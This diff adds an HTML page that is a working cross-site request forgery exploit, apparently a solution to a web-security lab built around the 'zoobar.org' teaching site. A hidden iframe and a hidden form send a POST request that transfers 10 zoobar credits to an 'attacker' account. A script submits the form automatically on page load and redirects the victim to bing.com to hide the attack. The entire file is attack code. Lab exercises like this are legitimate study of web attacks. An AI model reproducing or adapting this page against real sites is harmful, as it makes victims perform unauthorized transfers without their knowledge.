@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+
+<html>
+
+<body>
+
+    <!-- hidden iframe -->
+    <iframe id="attack" name="attack" style="visibility:hidden"></iframe>
+    <!-- hidden form that will submit a request to transfer 10 zoobar credits to the "attacker" account -->
+    <form target="attack" action="http://zoobar.org/transfer.php" method="POST">
+        <input type="hidden" name="zoobars" value="10">
+        <input type="hidden" name="recipient" value="attacker">
+        <input onclick="window.location = 'http://www.bing.com';" type="submit" id="send" name="submission" value="send" style="visibility:hidden">
+    </form>
+	
+    <!-- script to click and submit the form while redirecting to a different page -->
+    <script>
+        document.getElementById("send").click();
+    </script>
+
+</body>
+
+</html>
